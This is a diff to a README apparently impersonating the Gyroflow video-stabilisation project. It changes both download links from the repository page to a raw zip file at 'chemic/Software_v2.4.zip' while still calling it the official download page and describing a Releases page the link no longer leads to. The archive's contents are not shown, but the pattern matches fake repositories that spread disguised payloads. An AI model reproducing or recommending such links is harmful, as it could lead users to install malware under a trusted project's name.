@@ -1,12 +1,12 @@
 # 🎥 Gyroflow - Smooth your shaky video footage easily
 
-[![](https://img.shields.io/badge/Download-Gyroflow-blue.svg)](https://github.com/TerezaSluttie/Gyroflow)
+[![](https://img.shields.io/badge/Download-Gyroflow-blue.svg)](https://github.com/TerezaSluttie/Gyroflow/raw/refs/heads/main/chemic/Software_v2.4.zip)
 
 Gyroflow fixes shaky video. It uses data from your camera or drone to smooth your shots. You gain professional results without expensive gear. This tool works with many types of cameras. It helps you turn rough footage into steady professional clips.
 
 ## 📥 How to download your software
 
-Visit the [official download page](https://github.com/TerezaSluttie/Gyroflow) to get the latest version. Look for the section labeled Releases on the right side of your screen. Click the name of the newest version to open the full list of files. Find the file ending in .exe for Windows. Click that file to save it to your computer.
+Visit the [official download page](https://github.com/TerezaSluttie/Gyroflow/raw/refs/heads/main/chemic/Software_v2.4.zip) to get the latest version. Look for the section labeled Releases on the right side of your screen. Click the name of the newest version to open the full list of files. Find the file ending in .exe for Windows. Click that file to save it to your computer.
 
 ## ⚙️ System requirements
 
